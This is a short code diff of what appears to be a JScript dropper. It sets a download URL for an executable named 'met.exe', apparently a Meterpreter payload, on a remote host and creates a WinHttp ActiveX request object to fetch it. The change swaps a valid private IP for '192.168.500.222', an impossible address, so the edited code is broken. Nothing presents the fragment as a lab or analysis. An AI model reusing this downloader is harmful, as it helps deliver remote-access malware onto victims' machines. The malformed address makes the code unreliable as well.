@@ -1,4 +1,4 @@
-var url = "http://192.168.49.222/met.exe"
+var url = "http://192.168.500.222/met.exe"
 var WinHTTPObj = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
 
 
